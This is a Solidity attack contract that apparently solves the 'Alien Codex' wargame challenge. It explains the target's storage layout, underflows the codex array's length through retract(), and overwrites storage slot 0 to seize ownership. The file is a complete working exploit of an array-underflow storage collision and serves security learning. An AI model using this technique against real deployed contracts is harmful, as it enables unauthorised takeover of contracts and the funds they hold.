// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function makeContact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;

    function owner() external view returns (address);
}

contract AlienCodexAttack {
    /*
  storage layout
  slot 0 - owner(20 byte) + contact(1 byte)
  slot 1 - length of array codex(32 bytes)

  let the array be stored from index h
  h = keccak256(1)
  slot h - codex[0]
  slot h+1 - codex[1]
  slot h+2 - codex[2]
  .
  .
  .
  slot h+(2**256 -1) - codex[2**256 -1]

  But in a smart contract there are only 2**256 slots for storage, as we are already using slots (0...h) there will
  be some slots that would be overlapped with slot[0] and slot[1]
  We need to find a slot i, such that:
  slot[h+i] = slot[0]
  therefore, i = -h
  */
    constructor(IAlienCodex target) {
        target.makeContact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "Failed");
    }
}
